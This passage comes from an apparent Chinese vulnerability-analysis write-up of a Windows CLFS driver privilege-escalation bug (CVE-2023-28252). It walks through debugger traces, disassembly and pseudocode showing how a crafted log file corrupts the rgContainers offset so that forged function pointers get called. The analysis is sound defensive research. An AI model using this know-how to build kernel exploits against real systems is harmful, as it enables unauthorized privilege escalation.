style="display:flex;"><span>fffff800`53141b70 0f841ae50000 je CLFS!ClfsMgmtDeregisterManagedClient+0xe530 (fffff800`53150090)</span></span><span style="display:flex;"><span>fffff800`53141b76 4c8b150335feff mov r10,qword ptr [CLFS!_imp_KeEnterCriticalRegion (fffff800`53125080)]</span></span><span style="display:flex;"><span>fffff800`53141b7d e8ae5eb302 call nt!KeEnterCriticalRegion (fffff800`55c77a30)</span></span><span style="display:flex;"><span>0: kd> u fffff800`53112b20</span></span><span style="display:flex;"><span>CLFS!ClfsEarlierLsn:</span></span><span style="display:flex;"><span>fffff800`53112b20 488b0511280000 mov rax,qword ptr [CLFS!CLFS_LSN_INVALID (fffff800`53115338)]</span></span><span style="display:flex;"><span>fffff800`53112b27 4885c9 test rcx,rcx</span></span><span style="display:flex;"><span>fffff800`53112b2a 7436 je CLFS!ClfsEarlierLsn+0x42 (fffff800`53112b62)</span></span><span style="display:flex;"><span>fffff800`53112b2c 488b09 mov rcx,qword ptr [rcx]</span></span><span style="display:flex;"><span>fffff800`53112b2f 483b0d8a230000 cmp rcx,qword ptr [CLFS!CLFS_LSN_NULL (fffff800`53114ec0)]</span></span><span style="display:flex;"><span>fffff800`53112b36 742a je CLFS!ClfsEarlierLsn+0x42 (fffff800`53112b62)</span></span><span style="display:flex;"><span>fffff800`53112b38 483bc8 cmp rcx,rax</span></span><span style="display:flex;"><span>fffff800`53112b3b 7425 je CLFS!ClfsEarlierLsn+0x42 (fffff800`53112b62)</span></span></code></pre></div><p>调用pContainer的函数指针汇编如下</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>PAGE:00000001C00337AF E8 2C 0F 00 00 call ?GetSymbol@CClfsBaseFile@@QEAAJJKPEAPEAU_CLFS_CONTAINER_CONTEXT@@@Z ; CClfsBaseFile::GetSymbol(long,ulong,_CLFS_CONTAINER_CONTEXT * *)</span></span><span style="display:flex;"><span>PAGE:00000001C00337AF</span></span><span style="display:flex;"><span>PAGE:00000001C00337B4 8B D8 mov ebx, eax</span></span><span style="display:flex;"><span>PAGE:00000001C00337B6 ; 66: v17 = Symbol;</span></span><span style="display:flex;"><span>PAGE:00000001C00337B6 89 44 24 40 mov [rsp+0B8h+var_78], eax</span></span><span style="display:flex;"><span>PAGE:00000001C00337BA ; 67: if ( Symbol &lt; 0 )</span></span><span style="display:flex;"><span>PAGE:00000001C00337BA 85 C0 test eax, eax</span></span><span style="display:flex;"><span>PAGE:00000001C00337BC ; 68: goto LABEL_21;</span></span><span style="display:flex;"><span>PAGE:00000001C00337BC 0F 88 F1 00 00 00 js loc_1C00338B3</span></span><span style="display:flex;"><span>PAGE:00000001C00337BC</span></span><span style="display:flex;"><span>PAGE:00000001C00337C2 ; 69: v15 = (void (__fastcall ***)(_QWORD))*((_QWORD *)v25 + 3);</span></span><span style="display:flex;"><span>PAGE:00000001C00337C2 48 8B 44 24 70 mov rax, [rsp+0B8h+var_48]</span></span><span style="display:flex;"><span>PAGE:00000001C00337C7 48 8B 48 18 mov rcx, [rax+18h]</span></span><span style="display:flex;"><span>PAGE:00000001C00337CB ; 70: if ( v15 )</span></span><span style="display:flex;"><span>PAGE:00000001C00337CB 48 85 C9 test rcx, rcx</span></span><span style="display:flex;"><span>PAGE:00000001C00337CE 0F 84 EB 00 00 00 jz loc_1C00338BF</span></span><span style="display:flex;"><span>PAGE:00000001C00337CE</span></span><span style="display:flex;"><span>PAGE:00000001C00337D4 ; 73: v7 = v20;</span></span><span style="display:flex;"><span>PAGE:00000001C00337D4 48 8B F9 mov rdi, rcx</span></span><span style="display:flex;"><span>PAGE:00000001C00337D7 ; 72: v20 = (struct CClfsContainer *)*((_QWORD *)v25 + 3);// 调用函数指针</span></span><span style="display:flex;"><span>PAGE:00000001C00337D7 48 89 4C 24 50 mov [rsp+0B8h+var_68], rcx</span></span><span style="display:flex;"><span>PAGE:00000001C00337DC ; 74: (**v15)(v15);</span></span><span style="display:flex;"><span>PAGE:00000001C00337DC 48 8B 01 mov rax, [rcx]</span></span><span style="display:flex;"><span>PAGE:00000001C00337DF 48 8B 00 mov rax, [rax]</span></span><span style="display:flex;"><span>PAGE:00000001C00337E2 FF 15 00 1E FF FF call cs:__guard_dispatch_icall_fptr</span></span></code></pre></div><p>pContainer指向的对象的第一个函数指针指向了ClfsMgmtDeregisterManagedClient，该函数会调用rcx+0x28和rcx+0x8的函数指针。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>NTSTATUS<span style="color:#66d9ef">__stdcall</span><span style="color:#a6e22e">ClfsMgmtDeregisterManagedClient</span>(CLFS_MGMT_CLIENT ClientCookie)</span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span> NTSTATUS v2;<span style="color:#75715e">// edi</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/></span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>ClientCookie )</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1073741811</span>;</span></span><span style="display:flex;"><span><span style="color:#a6e22e">KeEnterCriticalRegion</span>();</span></span><span style="display:flex;"><span> v2<span style="color:#f92672">=</span> (<span style="color:#f92672">*</span>(<span style="color:#66d9ef">__int64</span> (<span style="color:#66d9ef">__fastcall</span><span style="color:#f92672">**</span>)(CLFS_MGMT_CLIENT, _QWORD))(<span style="color:#f92672">*</span>(_QWORD<span style="color:#f92672">*</span>)ClientCookie<span style="color:#f92672">+</span><span style="color:#ae81ff">0x28</span>i64))(ClientCookie,<span style="color:#ae81ff">0</span>i64);</span></span><span style="display:flex;"><span> (<span style="color:#f92672">*</span>(<span style="color:#66d9ef">void</span> (<span style="color:#66d9ef">__fastcall</span><span style="color:#f92672">**</span>)(CLFS_MGMT_CLIENT))(<span style="color:#f92672">*</span>(_QWORD<span style="color:#f92672">*</span>)ClientCookie<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>i64))(ClientCookie);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">KeLeaveCriticalRegion</span>();</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> v2;</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p>而rcx指向了0x501000，在内存布局中rcx+0x28和rcx+0x8分别指向了RtlClearBit和ClfsEarlierLsn函数。</p><p>回溯触发过程，容易得出结论，漏洞利用的核心是rgContainers数组被修改导致定位到了错误的container context，在正常文件中rgContainers处偏移为0x1470，在触发漏洞时，该值被修改为了0x1570。错误的container context由攻击者控制，从而控制到了CClfsContainer对象，导致调用了错误的函数指针。</p><p><img src="../../../images/vulnerability/Windows-CLFS-EoP/5.png" alt="" path="vulnerability/Windows-CLFS-EoP/" if="vulnerability/Windows-CLFS-EoP/CVE-2023-28252.zh-cn.md"/></p><p>再次调试，在主blf文件的baselogrecord+0x328位置处下写断点。运行样本。在CLFS!CClfsBaseFilePersisted::WriteMetadataBlock+0x9a处断下。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1: kd> ba w2 FFFFE381A2303000+0x398</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span>0: kd> k</span></span><span style="display:flex;"><span> # Child-SP RetAddr Call Site</span></span><span style="display:flex;"><span>00 ffffa00a`57e30340 fffff800`531519cf CLFS!CClfsBaseFilePersisted::WriteMetadataBlock+0x9a</span></span><span style="display:flex;"><span>01 ffffa00a`57e303d0 fffff800`5312b839 CLFS!CClfsBaseFilePersisted::ExtendMetadataBlock+0x423</span></span><span style="display:flex;"><span>02 ffffa00a`57e304a0 fffff800`5312ccbc CLFS!CClfsBaseFilePersisted::AddSymbol+0x10d</span></span><span style="display:flex;"><span>03 ffffa00a`57e30520 fffff800`5312b3e6 CLFS!CClfsBaseFilePersisted::AddContainer+0xdc</span></span><span style="display:flex;"><span>04 ffffa00a`57e305d0 fffff800`53154845 CLFS!CClfsLogFcbPhysical::AllocContainer+0x136</span></span><span style="display:flex;"><span>05 ffffa00a`57e30670 fffff800`53132dd5 CLFS!CClfsRequest::AllocContainer+0x27d</span></span><span style="display:flex;"><span>06 ffffa00a`57e30730 fffff800`531328e7 CLFS!CClfsRequest::Dispatch+0x351</span></span><span style="display:flex;"><span>07 ffffa00a`57e30780 fffff800`53132837 CLFS!ClfsDispatchIoRequest+0x87</span></span><span style="display:flex;"><span>08 ffffa00a`57e307d0 fffff800`55c954d5 CLFS!CClfsDriver::LogIoDispatch+0x27</span></span><span style="display:flex;"><span>09 ffffa00a`57e30800 fffff800`560a6048 nt!IofCallDriver+0x55</span></span><span style="display:flex;"><span>0a ffffa00a`57e30840 fffff800`560a5e47 nt!IopSynchronousServiceTail+0x1a8</span></span><span style="display:flex;"><span>0b ffffa00a`57e308e0 fffff800`560a51c6 nt!IopXxxControlFile+0xc67</span></span><span style="display:flex;"><span>0c ffffa00a`57e30a20 fffff800`55e0d8f5 nt!NtDeviceIoControlFile+0x56</span></span><span style="display:flex;"><span>0d ffffa00a`57e30a90 00007ffd`9160d1a4 nt!KiSystemServiceCopyEnd+0x25</span></span><span style="display:flex;"><span>0e 0000009e`74b1b448 00007ffd`8f0c572b ntdll!NtDeviceIoControlFile+0x14</span></span><span style="display:flex;"><span>0f 0000009e`74b1b450 00007ffd`900c5bf1 KERNELBASE!DeviceIoControl+0x6b</span></span><span style="display:flex;"><span>10 0000009e`74b1b4c0 00007ffd`7e4a2895 KERNEL32!DeviceIoControlImplementation+0x81</span></span><span style="display:flex;"><span>11 0000009e`74b1b510 00007ffd`7e4a245c clfsw32!AddLogContainerSet+0x425</span></span><span style="display:flex;"><span>12 0000009e`74b1b5f0 00007ff7`ecad3e82 clfsw32!AddLogContainer+0x3c</span></span><span style="display:flex;"><span>13 0000009e`74b1b630 00007ff7`ecad461c 0624fbfa7618628e1ede80fcc3c36b25+0x3e82</span></span><span style="display:flex;"><span>14 0000009e`74b1f890 00007ffd`900c7614 0624fbfa7618628e1ede80fcc3c36b25+0x461c</span></span><span style="display:flex;"><span>15 0000009e`74b1f8d0 00007ffd`915c26a1 KERNEL32!BaseThreadInitThunk+0x14</span></span><span style="display:flex;"><span>16 0000009e`74b1f900 00000000`00000000 ntdll!RtlUserThreadStart+0x21</span></span></code></pre></div><p>对应的汇编指令为</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">53134276</span><span style="color:#ae81ff">4</span>aff0430 inc qword ptr [rax<span style="color:#f92672">+</span>r14]</span></span></code></pre></div><p>在样本中为循环给创建的10个副blf文件添加日志容器</p><p><img src="../../../images/vulnerability/Windows-CLFS-EoP/6.png" alt="" path="vulnerability/Windows-CLFS-EoP/" if="vulnerability/Windows-CLFS-EoP/CVE-2023-28252.zh-cn.md"/></p><hr><p>在CLFS!CClfsBaseFilePersisted::WriteMetadataBlock+0x9a函数中对应位置伪代码及汇编如下：</p><p>从this+0x30处取指针并解引用，而后访问指针指向的内存偏移24*a2的位置，将该处作为指针赋给v8，v8内存位置偏移0x28后作为指针并解引用赋给v10，v10和v8相加并解引用后自增1</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span><span style="color:#66d9ef">__fastcall</span> CClfsBaseFilePersisted<span style="color:#f92672">::</span><span style="color:#a6e22e">WriteMetadataBlock</span>(CClfsBaseFilePersisted<span style="color:#f92672">*</span>this,<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span> a2,<span style="color:#66d9ef">char</span> a3)</span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span> v4;<span style="color:#75715e">// rsi</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span> v6;<span style="color:#75715e">// ebx</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">char</span> v7;<span style="color:#75715e">// r12</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">__int64</span> v8;<span style="color:#75715e">// r14</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">int</span> v9;<span style="color:#75715e">// r15d</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">__int64</span> v10;<span style="color:#75715e">// rax</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">__int64</span> v11;<span style="color:#75715e">// r9</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">__int64</span> v12;<span style="color:#75715e">// rdx</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span> i;<span style="color:#75715e">// esi</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>v14;<span style="color:#75715e">// rdx</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">struct</span> _CLFS_CONTAINER_CONTEXT<span style="color:#f92672">*</span>v15;<span style="color:#75715e">// rcx</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> _QWORD<span style="color:#f92672">*</span>v16;<span style="color:#75715e">// rsi</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span> v18;<span style="color:#75715e">// [rsp+34h] [rbp-54h]</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">int</span> v19;<span style="color:#75715e">// [rsp+34h] [rbp-54h]</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span> v20;<span style="color:#75715e">// [rsp+3Ch] [rbp-4Ch] BYREF</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">struct</span> _CLFS_CONTAINER_CONTEXT<span style="color:#f92672">*</span>v21;<span style="color:#75715e">// [rsp+40h] [rbp-48h] BYREF</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">__int64</span> v22;<span style="color:#75715e">// [rsp+48h] [rbp-40h] BYREF</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">__int64</span> v23;<span style="color:#75715e">// [rsp+50h] [rbp-38h]</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> BOOLEAN v24;<span style="color:#75715e">// [rsp+A8h] [rbp+20h]</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/></span></span><span style="display:flex;"><span> v4<span style="color:#f92672">=</span> a2;</span></span><span style="display:flex;"><span> v6<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;</span></span><span style="display:flex;"><span> v23<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>i64;</span></span><span style="display:flex;"><span> v21<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>i64;</span></span><span style="display:flex;"><span> v7<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;</span></span><span style="display:flex;"><span> v24<span style="color:#f92672">=</span><span style="color:#a6e22e">ExAcquireResourceExclusiveLite</span>(<span style="color:#f92672">*</span>((PERESOURCE<span style="color:#f92672">*</span>)this<span style="color:#f92672">+</span><span style="color:#ae81ff">4</span>),<span style="color:#ae81ff">1u</span>);</span></span><span style="display:flex;"><span> v8<span style="color:#f92672">=</span><span style="color:#f92672">*</span>(_QWORD<span style="color:#f92672">*</span>)(<span style="color:#ae81ff">24</span><span style="color:#f92672">*</span> v4<span style="color:#f92672">+</span><span style="color:#f92672">*</span>((_QWORD<span style="color:#f92672">*</span>)this<span style="color:#f92672">+</span><span style="color:#ae81ff">6</span>));<span style="color:#75715e">// 获取偏移 (this+0x30h)</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> v23<span style="color:#f92672">=</span> v8;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( v8 )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> v7<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>;</span></span><span style="display:flex;"><span> v10<span style="color:#f92672">=</span><span style="color:#f92672">*</span>(<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span><span style="color:#f92672">*</span>)(v8<span style="color:#f92672">+</span><span style="color:#ae81ff">40</span>);</span></span><span style="display:flex;"><span><span style="color:#f92672">**</span>v11<span style="color:#f92672">=</span><span style="color:#f92672">++*</span>(_QWORD<span style="color:#f92672">*</span>)(v10<span style="color:#f92672">+</span> v8)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">1</span>i64;<span style="color:#f92672">**</span></span></span><span style="display:flex;"><span> v12<span style="color:#f92672">=</span><span style="color:#f92672">*</span>((_QWORD<span style="color:#f92672">*</span>)this<span style="color:#f92672">+</span><span style="color:#ae81ff">6</span>);</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>PAGE:00000001C0034202 48 8B F9 mov rdi, rcx</span></span><span style="display:flex;"><span>PAGE:00000001C0034205 33 DB xor ebx, ebx</span></span><span style="display:flex;"><span>PAGE:00000001C0034207 ; 24: v23 = 0i64;</span></span><span style="display:flex;"><span>PAGE:00000001C0034207 48 89 5C 24 50 mov [rsp+88h+var_38], rbx</span></span><span style="display:flex;"><span>PAGE:00000001C003420C ; 25: v21 = 0i64;</span></span><span style="display:flex;"><span>PAGE:00000001C003420C 48 89 5C 24 40 mov [rsp+88h+var_48], rbx</span></span><span style="display:flex;"><span>PAGE:00000001C0034211 ; 26: v7 = 0;</span></span><span style="display:flex;"><span>PAGE:00000001C0034211 45 32 E4 xor r12b, r12b</span></span><span style="display:flex;"><span>PAGE:00000001C0034214 ; 27: v24 = ExAcquireResourceExclusiveLite(*((PERESOURCE *)this + 4), 1u);</span></span><span style="display:flex;"><span>PAGE:00000001C0034214 44 88 64 24 30 mov [rsp+88h+var_58], r12b</span></span><span style="display:flex;"><span>PAGE:00000001C0034219 B2 01 mov dl, 1 ; Wait</span></span><span style="display:flex;"><span>PAGE:00000001C003421B 48 8B 49 20 mov rcx, [rcx+20h] ; Resource</span></span><span style="display:flex;"><span>PAGE:00000001C003421F 48 FF 15 8A 0E FF FF call cs:__imp_ExAcquireResourceExclusiveLite</span></span><span style="display:flex;"><span>PAGE:00000001C003421F</span></span><span style="display:flex;"><span>PAGE:00000001C0034226 0F 1F 44 00 00 nop dword ptr [rax+rax+00h]</span></span><span style="display:flex;"><span>PAGE:00000001C003422B 88 84 24 A8 00 00 00 mov [rsp+88h+arg_18], al</span></span><span style="display:flex;"><span>PAGE:00000001C003422B</span></span><span style="display:flex;"><span>PAGE:00000001C0034232</span></span><span style="display:flex;"><span>PAGE:00000001C0034232 loc_1C0034232: ; DATA XREF: .rdata:00000001C0017DD0↑o</span></span><span style="display:flex;"><span>PAGE:00000001C0034232 ; __try { // __finally(_CClfsBaseFilePersisted__WriteMetadataBlock____1___fin$0)</span></span><span style="display:flex;"><span>PAGE:00000001C0034232 44 8B EE mov r13d, esi</span></span><span style="display:flex;"><span>PAGE:00000001C0034235 48 8D 0C 75 00 00 00 00 lea rcx, ds:0[rsi*2]</span></span><span style="display:flex;"><span>PAGE:00000001C003423D 48 03 CE add rcx, rsi</span></span><span style="display:flex;"><span>PAGE:00000001C0034240 4C 8D 04 CD 00 00 00 00 lea r8, ds:0[rcx*8]</span></span><span style="display:flex;"><span>PAGE:00000001C0034248 ; 28: v8 = *(_QWORD *)(24 * v4 + *((_QWORD *)this + 6));// 获取偏移 (this+0x30h)</span></span><span style="display:flex;"><span>PAGE:00000001C0034248 48 8B 4F 30 mov rcx, [rdi+30h]</span></span><span style="display:flex;"><span>PAGE:00000001C003424C 4D 8B 34 08 mov r14, [r8+rcx]</span></span><span style="display:flex;"><span>PAGE:00000001C0034250 ; 29: v23 = v8;</span></span><span style="display:flex;"><span>PAGE:00000001C0034250 4C 89 74 24 50 mov [rsp+88h+var_38], r14</span></span><span style="display:flex;"><span>PAGE:00000001C0034255 ; 30: if ( v8 )</span></span><span style="display:flex;"><span>PAGE:00000001C0034255 4D 85 F6 test r14, r14</span></span><span style="display:flex;"><span>PAGE:00000001C0034258 75 10 jnz short loc_1C003426A</span></span><span style="display:flex;"><span>PAGE:00000001C0034258</span></span><span style="display:flex;"><span>PAGE:00000001C003425A ; 74: v9 = -1072037875;</span></span><span style="display:flex;"><span>PAGE:00000001C003425A 41 BF 0D 00 1A C0 mov r15d, 0C01A000Dh</span></span><span style="display:flex;"><span>PAGE:00000001C0034260 ; 75: v18 = -1072037875;</span></span><span style="display:flex;"><span>PAGE:00000001C0034260 44 89 7C 24 34 mov [rsp+88h+var_54], r15d</span></span><span style="display:flex;"><span>PAGE:00000001C0034265 E9 28 01 00 00 jmp loc_1C0034392</span></span><span style="display:flex;"><span>PAGE:00000001C0034265</span></span><span style="display:flex;"><span>PAGE:00000001C003426A ; ---------------------------------------------------------------------------</span></span><span style="display:flex;"><span>PAGE:00000001C003426A ; 32: v7 = 1;</span></span><span style="display:flex;"><span>PAGE:00000001C003426A</span></span><span style="display:flex;"><span>PAGE:00000001C003426A loc_1C003426A: ; CODE XREF: CClfsBaseFilePersisted::WriteMetadataBlock(ulong,uchar)+78↑j</span></span><span style="display:flex;"><span>PAGE:00000001C003426A 41 B4 01 mov r12b, 1</span></span><span style="display:flex;"><span>PAGE:00000001C003426D ; 33: v10 = *(unsigned int *)(v8 + 40);</span></span><span style="display:flex;"><span>PAGE:00000001C003426D 44 88 64 24 30 mov [rsp+88h+var_58], r12b</span></span><span style="display:flex;"><span>PAGE:00000001C0034272 41 8B 46 28 mov eax, [r14+28h]</span></span><span style="display:flex;"><span>PAGE:00000001C0034276 ; 34: v11 = ++*(_QWORD *)(v10 + v8) &amp; 1i64;</span></span><span style="display:flex;"><span>PAGE:00000001C0034276 4A FF 04 30 **inc qword ptr [rax+r14]**</span></span></code></pre></div><p>在zscaler对CVE-2022-37969的分析中提到过CClfsBaseFilePersisted类结构，CClfsBaseFilePersisted类的this+0x30处存储了一个指向堆缓冲区的指针，该缓冲区大小为0xa0，在缓冲区0x30偏移处存储了指向base block的指针，如下所示：</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>0: kd> dps rdi</span></span><span style="display:flex;"><span>ffffa289`156cc000 fffff800`53114020 CLFS!CClfsBaseFilePersisted::`vftable'</span></span><span style="display:flex;"><span>ffffa289`156cc008 ffffffff`00000001</span></span><span style="display:flex;"><span>ffffa289`156cc010 00000000`00000000</span></span><span style="display:flex;"><span>ffffa289`156cc018 00000018`00000000</span></span><span style="display:flex;"><span>ffffa289`156cc020 ffffa289`1469a310</span></span><span style="display:flex;"><span>ffffa289`156cc028 00000000`19630006</span></span><span style="display:flex;"><span>ffffa289`156cc030 **ffffa289`19254810 // 堆指针**</span></span><span style="display:flex;"><span>ffffa289`156cc038 ffffa289`17bfd4d0</span></span><span style="display:flex;"><span>ffffa289`156cc040 ffffe381`a8743088</span></span><span style="display:flex;"><span>ffffa289`156cc048 00000000`0000000b</span></span><span style="display:flex;"><span>ffffa289`156cc050 ffffa289`156cc000</span></span><span style="display:flex;"><span>ffffa289`156cc058 ffffe381`a87430e0</span></span><span style="display:flex;"><span>ffffa289`156cc060 00000000`0000000b</span></span><span style="display:flex;"><span>ffffa289`156cc068 ffffa289`156cc000</span></span><span style="display:flex;"><span>ffffa289`156cc070 ffffe381`a8743138</span></span><span style="display:flex;"><span>ffffa289`156cc078 00000000`0000000b</span></span><span style="display:flex;"><span>0: kd> dq ffffa289`19254810</span></span><span style="display:flex;"><span>ffffa289`19254810 ffffe381`a5c7f680 00000000`00000400</span></span><span style="display:flex;"><span>ffffa289`19254820 00000000`00000000 ffffe381`a5c7f680</span></span><span style="display:flex;"><span>ffffa289`19254830 00000400`00000400 00000000`00000001</span></span><span style="display:flex;"><span>ffffa289`19254840 **ffffe381`a8743000** 00000800`00007a00 **// 指向了base block**</span></span><span style="display:flex;"><span>ffffa289`19254850 00000000`00000002 ffffe381`a8743000</span></span><span style="display:flex;"><span>ffffa289`19254860 00008200`00007a00 00000000`00000003</span></span><span style="display:flex;"><span>ffffa289`19254870 ffffe381`a5353cc0 0000fc00`00000200</span></span><span style="display:flex;"><span>ffffa289`19254880 00000000`00000004 ffffe381`a5353cc0</span></span><span style="display:flex;"><span>0: kd> db ffffe381`a8743000 **// base block内容**</span></span><span style="display:flex;"><span>ffffe381`a8743000 15 00 01 00 3d 00 3d 00-00 00 00 00 00 00 00 00 ....=.=.........</span></span><span style="display:flex;"><span>ffffe381`a8743010 02 00 00 00 00 00 00 00-00 00 00 00 ff ff ff ff ................</span></span><span style="display:flex;"><span>ffffe381`a8743020 00 00 00 00 ff ff ff ff-70 00 00 00 00 00 00 00 ........p.......</span></span><span style="display:flex;"><span>ffffe381`a8743030 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................</span></span><span style="display:flex;"><span>ffffe381`a8743040 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................</span></span><span style="display:flex;"><span>ffffe381`a8743050 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................</span></span><span style="display:flex;"><span>ffffe381`a8743060 00 00 00 00 00 00 00 00-80 79 00 00 00 00 00 00 .........y......</span></span><span style="display:flex;"><span>ffffe381`a8743070 01 00 00 00 00 00 00 00-9c 06 ce e1 00 1c ee 11 ................</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span>0: kd> !pool ffffe381`a8743000</span></span><span style="display:flex;"><span>Pool page ffffe381a8743000 region is Paged pool</span></span><span style="display:flex;"><span>*ffffe381a8743000 : large page allocation, tag is Clfs, size is 0x7a00 bytes</span></span><span style="display:flex;"><span> Pooltag Clfs : CLFS General buffer, or owner page lookaside list, Binary : clfs.sys</span></span></code></pre></div><hr><p>回到调试器中r14和rax寄存器值分别问ffffe381a2303030和0000000000000369</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>0: kd> rr14</span></span><span style="display:flex;"><span>r14=ffffe381a2303030</span></span><span style="display:flex;"><span>0: kd> rrax</span></span><span style="display:flex;"><span>rax=0000000000000369</span></span></code></pre></div><p>可以看出ffffe381a2303030位于主blf文件的base block + 0x30位置，rax值取自于base block + 0x30 + 0x28</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span> db ffffe381a2303030<span style="color:#f92672">+</span><span style="color:#ae81ff">0x28</span></span></span><span style="display:flex;"><span>ffffe381<span style="color:#960050;background-color:#1e0010">`</span>a2303058<span style="color:#ae81ff">69</span><span style="color:#ae81ff">03</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> i...............</span></span></code></pre></div><p>所以代码会让主blf的base block + 0x30 + 0x369 = base block +0x399处的一个字节自增1，而该处和BaseLogRecord的rgContainers的高字节重叠，前面说过正常blf文件的rgContainers值为0x1470，在该处自增1后，高字节0x14自增就变为了0x15，导致该处值变为0x1570，从而导致后续定位主blf文件的container context时定位到了攻击者伪造的container context。</p><p>这里的问题是，该处原为给10个副blf文件添加日志容器，所以按正常来讲该处定位到的应该是副blf文件的base block，而不是主blf文件的base block。回到CClfsBaseFilePersisted::WriteMetadataBlock函数中，定位base block代码如下</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>v8<span style="color:#f92672">=</span><span style="color:#f92672">*</span>(_QWORD<span style="color:#f92672">*</span>)(<span style="color:#ae81ff">24</span><span style="color:#f92672">*</span> v4<span style="color:#f92672">+</span><span style="color:#f92672">*</span>((_QWORD<span style="color:#f92672">*</span>)this<span style="color:#f92672">+</span><span style="color:#ae81ff">6</span>));<span style="color:#75715e">// 获取偏移 (this+0x30h)</span></span></span></code></pre></div><p>其中*((_QWORD *)this + 6)为固定值(堆指针)，v4为传入WriteMetadataBlock的第二个参数，回溯到调用者，去除无关逻辑之后如下：</p><div class="highlight"><pre tabindex="0" 